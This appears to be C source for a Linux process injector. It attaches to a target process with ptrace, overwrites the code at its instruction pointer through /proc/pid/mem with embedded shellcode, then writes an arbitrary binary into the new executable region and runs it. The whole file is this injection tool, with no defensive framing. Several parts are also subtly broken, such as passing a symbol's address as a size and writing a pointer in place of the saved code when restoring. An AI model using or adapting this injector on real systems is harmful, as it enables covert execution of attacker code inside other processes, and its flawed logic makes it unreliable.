#define _GNU_SOURCE
#include <sys/ptrace.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <stdint.h>
#include <sys/uio.h>
#include <linux/ptrace.h>
#include <elf.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <malloc.h>
#include <fcntl.h>
#include <string.h>


#define FAILED_TO_TRACE() \
    printf("[+] Failed to trace %d\n", pid); \
    exit(1);


extern unsigned char _binary_raw_shellcode_bin_start;
extern unsigned char _binary_raw_shellcode_bin_end;
extern long _binary_raw_shellcode_bin_size;

void* tracee_pc_saved_data;


struct user_regs_struct saved_uregs;
struct user_regs_struct uregs;

void DumpHex(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

void print_x86_64_registers(struct user_regs_struct *urs){
    printf("r15: %p\n", urs->r15);
    printf("r14: %p\n", urs->r14);
    printf("r13: %p\n", urs->r13);
    printf("r12: %p\n", urs->r12);
    printf("rbp: %p\n", urs->rbp);
    printf("rbx: %p\n", urs->rbx);
    printf("r11: %p\n", urs->r11);
    printf("r10: %p\n", urs->r10);
    printf("r9: %p\n", urs->r9);
    printf("r8: %p\n", urs->r8);
    printf("rax: %p\n", urs->rax);
    printf("rcx: %p\n", urs->rcx);
    printf("rdx: %p\n", urs->rdx);
    printf("rsi: %p\n", urs->rsi);
    printf("rdi: %p\n", urs->rdi);
    printf("orig_rax: %p\n", urs->orig_rax);
    printf("rip: %p\n", urs->rip);
    printf("cs: %p\n", urs->cs);
    printf("eflags: %p\n", urs->eflags);
    printf("rsp: %p\n", urs->rsp);
    printf("ss: %p\n", urs->ss);
    printf("fs_base: %p\n", urs->fs_base);
    printf("gs_base: %p\n", urs->gs_base);
    printf("ds: %p\n", urs->ds);
    printf("es: %p\n", urs->es);
    printf("fs: %p\n", urs->fs);
    printf("gs: %p\n", urs->gs);
}

enum RegionPermissions{
    NONE = 0,
    READ = 1,
    WRITE = 2,
    EXECUTE = 4,
};

struct ProcMapsEntry {
    void * region_start;
    void * region_end;
    int permissons;
    char ** path;
};

int save_process_state_and_inject_transitional_shellcode(int pid, size_t size){
    struct iovec iov = {.iov_len = sizeof(saved_uregs),
                        .iov_base = &saved_uregs};
    if (ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov) == -1){
        perror("ptrace");
        exit(1);
    }
    printf("[+] Registers saved\n");
    int fd;
    char buf[128];
    memset(buf, 0, sizeof(buf));
    sprintf(buf, "/proc/%d/mem", pid);

    if ((fd = open(buf, O_RDWR)) == -1){
        perror("open");
        exit(1);
    }
    // overwrite current code
    if ((tracee_pc_saved_data = malloc(&_binary_raw_shellcode_bin_size)) == NULL){
        perror("malloc");
        return -1;
    }
    lseek(fd, saved_uregs.rip, SEEK_SET);
    read(fd, tracee_pc_saved_data, &_binary_raw_shellcode_bin_size);
    lseek(fd, saved_uregs.rip, SEEK_SET);
    write(fd, &_binary_raw_shellcode_bin_start, &_binary_raw_shellcode_bin_size);
    close(fd);


    print_x86_64_registers(&saved_uregs);
    DumpHex(tracee_pc_saved_data, &_binary_raw_shellcode_bin_size);

    struct user_regs_struct injected_uregs;
    memcpy(&injected_uregs, &saved_uregs, sizeof(saved_uregs));

    injected_uregs.rdi = size;
    iov.iov_base = &injected_uregs;

    if (ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov) == -1){
        printf("failed to set register state\n");
        exit(1);
    }

    /*
    memset(&injected_uregs, 0, sizeof(injected_uregs));
    if (ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov) == -1){
        perror("ptrace");
        exit(1);
    }
    print_x86_64_registers(&injected_uregs);
    */


    return 0;
}

int restore_process_state(pid){

    struct iovec iov = {.iov_len = sizeof(saved_uregs),
                        .iov_base = &saved_uregs};
    ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov);

    int fd;
    char buf[128];
    memset(buf, 0, sizeof(buf));
    sprintf(buf, "/proc/%d/mem", pid);

    if ((fd = open(buf, O_RDWR)) == -1){
        perror("open");
        exit(1);
    }
    // overwrite current code
    lseek(fd, saved_uregs.rip, SEEK_SET);
    write(fd, &tracee_pc_saved_data, &_binary_raw_shellcode_bin_size);
    close(fd);

    return 0;
}

/* fd - file descriptor for file to inject
 * region_start - address of the new region added
 *
 */
int write_binary(int pid, int shellcode_fd, size_t binary_size, void* region_start){

    struct iovec iov = {.iov_len = sizeof(saved_uregs),
                        .iov_base = &saved_uregs};
    if (ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov) == -1){
        perror("ptrace");
        exit(1);
    }

    char working_memory[4096];
    memset(working_memory, 0, sizeof(working_memory));
    char buf[128];
    memset(buf, 0, sizeof(buf));
    size_t total_written = 0;
    size_t num_read = 0;
    size_t num_written = 0;
    int memfd;
    if (region_start == NULL){
        return -1;
    }

    sprintf(buf, "/proc/%d/mem", pid);
    if ((memfd = open(buf, O_RDWR)) == -1){
        perror("open");
        exit(1);
    }
    if (lseek(memfd, region_start, SEEK_SET) == -1){
        perror("lseek");
        exit(1);
    }
    while (total_written < binary_size){
        if((num_read = read(shellcode_fd, working_memory, sizeof(working_memory))) == -1){
            perror("read");
            exit(1);
        } else if (num_read == 0){
            break;
        }
        if ((num_written = write(memfd, working_memory, num_read)) == -1){
            perror("write");
            exit(1);
        }
        total_written += num_written;
    }
    close(memfd);

    return 0;
}


int attach_and_inject(int pid, int shellcode_fd, size_t size){

    printf("[+] Attaching to: %d\n", pid);
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1){
        perror("ptrace");
        FAILED_TO_TRACE();
    }

    int wstatus;
    if (waitpid(pid, &wstatus, WUNTRACED) == -1){
        perror("waitpid");
        FAILED_TO_TRACE();
    }

    if (WIFSTOPPED(wstatus)) {
        // WSTOPSIG
        //stopped correctly
        printf("[+] Stopped target process\n");
        save_process_state_and_inject_transitional_shellcode(pid, size);
    } else {
        printf("Incorrect wstatus\n");
        FAILED_TO_TRACE();
    }

    // Execute initial shellcode
    if (ptrace(PTRACE_CONT, pid, 0, 0) == -1){
        perror("ptrace");
    }

    if (waitpid(pid, &wstatus, WUNTRACED) == -1){
        perror("waitpid");
        FAILED_TO_TRACE();
    }

    // inital shellcode has finished running
    if (WIFSTOPPED(wstatus)) {
        // WSTOPSIG
        printf("[+] Stopped target process again\n");
    } else {
        printf("Incorrect wstatus\n");
        FAILED_TO_TRACE();
    }

    // find address that was mmapped by reading rip
    struct iovec iov = {.iov_len = sizeof(saved_uregs),
                        .iov_base = &uregs};
    if (ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov) == -1){
        perror("ptrace");
        exit(1);
    }

    // adjust rip to account for breakpoint that was just hit
    uregs.rip = uregs.rip - 1;
    size_t controlled_executable_region = uregs.rip;
    printf("rip %p\n", controlled_executable_region);

    // set regs to fix pc
    if (ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov) == -1){
        perror("ptrace");
        exit(1);
    }
    // write binary to injectee and jump to address
    write_binary(pid, shellcode_fd, size, controlled_executable_region);


    //print_x86_64_registers(&uregs);

    printf("[+] Executing shellcode\n");
    // actual shellcode executes here
    if (ptrace(PTRACE_CONT, pid, 0, 0) == -1){
        perror("ptrace");
    }
    if (waitpid(pid, &wstatus, WUNTRACED) == -1){
        perror("waitpid");
        FAILED_TO_TRACE();
    }

    if (WIFSTOPPED(wstatus)) {
        // WSTOPSIG
        //stopped correctly
        printf("stopped %p\n", WSTOPSIG(wstatus));
    } else {
        printf("Incorrect wstatus\n");
    }

    //restore_process_state(pid);
    while (1) {}



    if (ptrace(PTRACE_DETACH, pid, 0, 0) == -1){
        perror("ptrace");
        return -1;
    }



    return 0;
}


int main (int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <pid> <binary>\n", argv[0]);
        exit(0);
    }

    int pid = atoi(argv[1]);
    size_t size = 0x64;
    struct stat sb;

    int fd;
    if ((fd = open(argv[2], O_RDONLY)) == -1){
        perror("open");
        return -1;
    }
    if (fstat(fd, &sb) == -1){
        printf("unable  to stat\n");
        return -1;
    }
    size = sb.st_size;

    attach_and_inject(pid, fd, size);

    close(fd);

    return 0;
}
